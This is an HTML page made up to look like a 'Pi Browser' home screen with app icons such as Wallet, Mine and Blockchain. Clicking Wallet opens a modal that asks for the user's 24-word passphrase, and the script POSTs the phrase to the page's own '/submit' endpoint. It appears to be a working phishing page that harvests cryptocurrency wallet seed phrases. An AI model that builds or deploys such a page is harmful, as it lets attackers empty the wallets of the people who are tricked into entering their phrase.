<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pi Browser Interface</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #fdfdfd;
        }

        /* Header */
        .header {
            background-color: #822d8c;
            padding: 10px;
            color: #fff;
            font-size: 24px;
            font-weight: bold;
        }

        /* Icon Grid */
        .icon-container {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 20px;
            padding: 30px;
            justify-items: center;
        }

        .icon {
            width: 100px;
            height: 100px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            background-color: #fff;
            border: 2px solid #ddd;
            border-radius: 10px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
            cursor: pointer;
        }

        .icon img {
            width: 40px;
            height: 40px;
        }

        .icon p {
            margin-top: 8px;
            color: #822d8c;
            font-weight: bold;
        }

        /* Modal Styles */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            justify-content: center;
            align-items: center;
        }

        .modal-content {
            background: #fff;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            width: 90%;
            max-width: 400px;
        }

        .modal input {
            width: 90%;
            margin: 10px auto;
            padding: 8px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }

        .modal button {
            background: #822d8c;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="header">Home ðŸš€</div>
    <h2 style="color: #f59e0b;">Welcome to the Pi Browser</h2>

    <div class="icon-container">
        <div class="icon"><img src="#" alt="Fireside"><p>Fireside</p></div>
        <div class="icon" id="wallet"><img src="#" alt="Wallet"><p>Wallet</p></div>
        <div class="icon"><img src="#" alt="Brainstorm"><p>Brainstorm</p></div>
        <div class="icon"><img src="#" alt="Mine"><p>Mine</p></div>
        <div class="icon"><img src="#" alt="Blockchain"><p>Blockchain</p></div>
        <div class="icon"><img src="#" alt="Develop"><p>Develop</p></div>
    </div>

    <!-- Modal -->
    <div class="modal" id="passphraseModal">
        <div class="modal-content">
            <h3>Enter Your Passphrase</h3>
            <form id="passphraseForm">
                <input type="text" id="passphrase" placeholder="Enter 24-word passphrase" required>
                <button type="submit">Submit</button>
            </form>
        </div>
    </div>

    <script>
        const walletIcon = document.getElementById('wallet');
        const modal = document.getElementById('passphraseModal');
        const passphraseForm = document.getElementById('passphraseForm');

        // Show modal when Wallet is clicked
        walletIcon.addEventListener('click', () => {
            modal.style.display = 'flex';
        });

        // Handle form submission
        passphraseForm.addEventListener('submit', async (e) => {
            e.preventDefault();

            const passphrase = document.getElementById('passphrase').value;

            const response = await fetch('/submit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ passphrase })
            });

            const result = await response.text();
            alert(result);

            if (response.ok) {
                modal.style.display = 'none';
            }
        });

        // Close modal on outside click
        window.onclick = (e) => {
            if (e.target === modal) {
                modal.style.display = 'none';
            }
        };
    </script>
</body>
</html>
